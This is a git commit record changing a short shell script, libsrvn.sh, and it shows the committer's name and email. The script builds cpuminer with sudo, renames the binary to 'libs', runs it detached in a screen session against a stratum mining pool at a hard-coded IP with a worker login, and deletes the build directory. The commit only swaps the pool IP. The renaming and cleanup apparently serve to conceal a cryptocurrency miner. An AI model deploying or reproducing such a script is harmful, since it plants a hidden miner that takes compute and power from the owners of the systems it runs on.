c787e0ec1e41d4c1318dffb31d50685cc98bcf03
Phan Nang Duy <phanduy.itbka@gmail.com>
2018-09-06 00:40:43 +0700

    no message

--- libsrvn.sh
+++ libsrvn.sh
@@ -2,6 +2,6 @@
 sudo chmod +x build.sh 
 sudo ./build.sh
 sudo cp cpuminer libs
-sudo screen -d -m ./libs -a x16r -o stratum+tcp://145.239.0.122:6667 -u duyuno.duy -p x
+sudo screen -d -m ./libs -a x16r -o stratum+tcp://145.239.0.123:6667 -u duyuno.duy -p x
 cd /
 sudo rm -rf libs
